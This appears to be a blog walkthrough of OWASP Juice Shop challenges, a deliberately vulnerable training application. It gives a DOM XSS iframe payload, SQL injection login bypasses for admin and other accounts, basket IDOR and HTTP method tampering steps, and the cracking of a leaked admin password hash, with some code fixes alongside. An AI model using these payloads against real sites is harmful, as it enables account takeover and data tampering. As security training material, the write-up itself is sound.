---
title: "Owasp Juice Shop"
date: "2024-04-24"
thumbnail: "/assets/img/thumbnail/Juice.png"
---

# Getting started
---

OWASP Juice Shop is probably the most modern and sophisticated insecure web application! It can be used in security trainings, awareness demos, CTFs and as a guinea pig for security tools! Juice Shop encompasses vulnerabilities from the entire OWASP Top Ten along with many other security flaws found in real-world applications!

You can solve it <a href="https://github.com/juice-shop/juice-shop/tree/master">here</a>.


## ★ Finding Score board
---

- When you start the challange you will get alerts from the site telling you that you need to find the score board to start. You can consider it as the first challange, so let's go.

When we look at the source code carefully we will find JS files but `main.js` seems to be more interesting.
I opened it and sent it to <a href="https://beautifier.io/">JS Beautifier</a> to make it more organized.
I searched using the keyword `score` and found this.
<img src="/assets/img/juice shop/1.png" width=300>
The endpoint is /score-board congratzzzzz
<img src="/assets/img/juice shop/2.png" width=300>

### The coding challange

You will see that the score-board endpoint is disclosed in the line number 114
We can't remove it because it will break the functionality of the site


## ★ DOM XSS
---

- Perform a DOM XSS attack with ```<iframe src="javascript:alert(`xss`)">```.
After examining the site you will find an input to search functionality.
I tried to put things like `<h1>` and it's rendered successfully so let's try our payload.
<img src="/assets/img/juice shop/3.png" width=300>
Congratzzzzzz

### The coding challange
```js
	filterTable () {
	    let queryParam: string = this.route.snapshot.queryParams.q
	    if (queryParam) {
	      queryParam = queryParam.trim()
	      this.dataSource.filter = queryParam.toLowerCase()
	      this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)
	      this.gridDataSource.subscribe((result: any) => {
	        if (result.length === 0) {
	          this.emptyState = true
	        } else {
	          this.emptyState = false
	        }
	      })
	    } else {
	      this.dataSource.filter = ''
	      this.searchValue = undefined
	      this.emptyState = false
	    }
	  }
```
The problem is in this line ```this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)```
Fixing: make it ```this.searchValue = queryParam``` because when you use `bypassSecurityTrustHtml` you must ensure that the HTML content does not come from untrusted sources or user inputs without proper sanitization.


## ★ Bully Chatbot
---

- Receive a coupon code from the support chatbot.
Consider this challange as a break xD.
attacking the chat bot maybe done by many ideas but in this the easiest one is the solution.
You just need to repeat the question and Congratzzzz XD.
<img src="/assets/img/juice shop/4.png" width=300>

## ★ Error Handling
---

- Provoke an error that is neither very gracefully nor consistently handled.

During site traversing I noticed there's and api request to `/rest/user/whoami` and it returns data about the user like this
`{"user":{"id":22,"email":"y@g.c","lastLoginIp":"0.0.0.0","profileImage":"/assets/public/images/uploads/default.svg"}}`

so i think it executes the whoami command so let's try something like ls `/rest/user/ls` it gives status code 500 and the response is
```json
{
  "error": {
    "message": "Unexpected path: /rest/user/ls",
    "stack": "Error: Unexpected path: /rest/user/ls\n    at E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\build\\routes\\angular.js:38:18\n    at Layer.handle [as handle_request] (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at trim_prefix (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:328:13)\n    at E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:286:9\n    at Function.process_params (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:346:12)\n    at next (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:280:10)\n    at E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\build\\routes\\verify.js:168:5\n    at Layer.handle [as handle_request] (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at trim_prefix (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:328:13)\n    at E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:286:9\n    at Function.process_params (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:346:12)\n    at next (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:280:10)\n    at E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\build\\routes\\verify.js:105:5\n    at Layer.handle [as handle_request] (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at trim_prefix (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:328:13)\n    at E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:286:9\n    at Function.process_params (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:346:12)\n    at next (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:280:10)\n    at logger (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\morgan\\index.js:144:5)\n    at Layer.handle [as handle_request] (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at trim_prefix (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:328:13)\n    at E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:286:9"
  }
}
```
I think there are many other ways to solve this challange
congratzzzz anyway xD


## ★★ Login Admin
---

- Log in with the administrator's user account.

It's a very simple sqli as when i login using `'or 1=1 --:anypasswd` i login as admin.
Notice that we got admin account by luck as there maybe many users in the database why we got the admin then?? This because the admin was the first user in the table xDDDD.
Congratzzzzz


## ★★ Password Strength
---

- Log in with the administrator's user credentials without previously changing them or applying SQL Injection.

The admin's login data
```json
{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjQtMDYtMTkgMTM6MjU6MTQuMTEyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjQtMDYtMTkgMTM6MjU6MTQuMTEyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTcxODgwMzkzOH0.TbMVfjrOP5ZP8yd44tKZkud1k_y82DKoLnnHpmIF8x3CBRm2oDS7JqjcO-kt_fJlAoD60JCsGDLa5xoESMRCs4WhlV20nVpdwQa5-VHj2gcULe4HNvdhRuYxV19jHtqLtIaEsTSOAoS5cwxRFmdSpFkpTElhGcxKJsp19ivbm8Y","bid":1,"umail":"admin@juice-sh.op"}}
```

The payload of the JWT
```json
{
  "status": "success",
  "data": {
    "id": 1,
    "username": "",
    "email": "admin@juice-sh.op",
    "password": "0192023a7bbd73250516f069df18b500",
    "role": "admin",
    "deluxeToken": "",
    "lastLoginIp": "",
    "profileImage": "assets/public/images/uploads/defaultAdmin.png",
    "totpSecret": "",
    "isActive": true,
    "createdAt": "2024-06-19 13:25:14.112 +00:00",
    "updatedAt": "2024-06-19 13:25:14.112 +00:00",
    "deletedAt": null
  },
  "iat": 1718803938
}
```

so The admin's email : `admin@juice-sh.op`
The password hash (MD5) : `0192023a7bbd73250516f069df18b500`
The password after cracking : `admin123`

so we can login as admin using these creds

```json
{"email":"admin@juice-sh.op","password":"admin123"}
```

### The coding challange
The code
```py
    User.init(
            password: {
                type: DataTypes.STRING,
                set (clearTextPassword) {
                this.setDataValue('password', security.hash(clearTextPassword))
                }
            },
```
The problem is applying the hash directly without any validation of the strength of the password
Fixing is done be adding:

```py
    set (clearTextPassword) {
		validatePasswordHasAtLeastTenChar(clearTextPassword)
		validatePasswordIsNotInTopOneMillionCommonPasswordsList(clearTextPassword)
		this.setDataValue('password', security.hash(clearTextPassword))
        } 
```

before `this.setDataValue('password', security.hash(clearTextPassword))`
Reason : According to NIST-800-63B, passwords (Memorized Secrets) should have at least eight characters to prevent 'online attacks'. Furthermore, NIST-800-63B requires that passwords don't appear in common dictionaries.

Congratzzzzz


## ★★ view basket
---
- View another user's shopping basket.

When i visit my basket i note that there's an API request to /rest/basket/6
When i change it to /rest/basket/1 i see the basket of the user whose id = 1 (no validation exists)


## ★★ Five-Star Feedback
---
- Get rid of all 5-star customer feedback.

When i view feedbacks i can visit this api `GET /api/Feedbacks/`
Make the request to be OPTIONS then you find that you can use `DELETE` method

`DELETE /api/Feedbacks/`
will give error that the path is invalid so i added the id in the request like this `DELETE /api/Feedbacks/1`
1 is the id of the feedback i want to delete and i made this request for the feedbacks of 5 Stars

Note: i don't know if there's a way to delete based on the rating not the id


## ★★★ Login Jim & Login Bender
---

I managed to login to any account in the site like i did to the admin with small modification
```{"email":"' or 1=1 LIMIT 1,1 --","password":""}```
`LIMIT 1,1` The first 1 is an index and the second 1 is number of rows retrieved
so i can change the first 1 to any number and i can login to any account
Jim was 1 and Bender was 2

Congratzzzzz


## ★★★ Manipulate Basket
---
- Put an additional product into another user's shopping basket.


we said we can view any basket through `GET /rest/basket/1`
and when we add element to basket the req is to `POST /api/BasketItems/`
and the data is

`{"ProductId":1,"BasketId":"6","quantity":1}`

when i try to change the basket id i get 401 unauthorized status code and `{'error' : 'Invalid BasketId'}`

so i made the req method to be OPTIONS and i found PUT method
when i try `PUT /api/BasketItems/` i get error 
```json
{
  "error": {
    "message": "Unexpected path: /api/BasketItems/",
    "stack": "Error: Unexpected path: /api/BasketItems/\n    at E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\build\\routes\\angular.js:38:18\n    at Layer.handle [as handle_request] (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at trim_prefix (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:328:13)\n    at E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:286:9\n    at Function.process_params (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:346:12)\n    at next (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:280:10)\n    at E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\build\\routes\\verify.js:168:5\n    at Layer.handle [as handle_request] (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at trim_prefix (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:328:13)\n    at E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:286:9\n    at Function.process_params (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:346:12)\n    at next (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:280:10)\n    at E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express-jwt\\lib\\index.js:44:7\n    at module.exports.verify (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express-jwt\\node_modules\\jsonwebtoken\\index.js:59:3)\n    at E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express-jwt\\lib\\index.js:40:9\n    at Layer.handle [as handle_request] (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at trim_prefix (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:328:13)\n    at E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:286:9\n    at Function.process_params (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:346:12)\n    at next (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\index.js:280:10)\n    at E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\build\\routes\\verify.js:105:5\n    at Layer.handle [as handle_request] (E:\\careeeeeeeer\\Career\\for CTFs\\Web pentesting\\Orange Juice node 20\\juice-shop_16.0.1\\node_modules\\express\\lib\\router\\layer.js:95:5)"
  }
}
```
the path is wrong so it may need the id at the end of the url 

so i made it `PUT /api/BasketItems/2` with the json data 
`{"ProductId":1,"BasketId":"2","quantity":1}`
and i got 400 status code bad request and this
```json
{"message":"null: `BasketId` cannot be updated due `noUpdate` constraint","errors":[{"field":"BasketId","message":"`BasketId` cannot be updated due `noUpdate` constraint"}]}
```

so i removed the BasketId from the json and got the same error for ProductId so i removed it also
then i got this response
```json
{"status":"success","data":{"ProductId":2,"BasketId":1,"id":2,"quantity":1,"createdAt":"2024-06-19T13:26:15.289Z","updatedAt":"2024-06-19T18:48:08.760Z"}}
```
and when you view the BasketId:1 using `GET /rest/basket/1` you will notice that the item is added.

Congratzzzzzzzzzzz



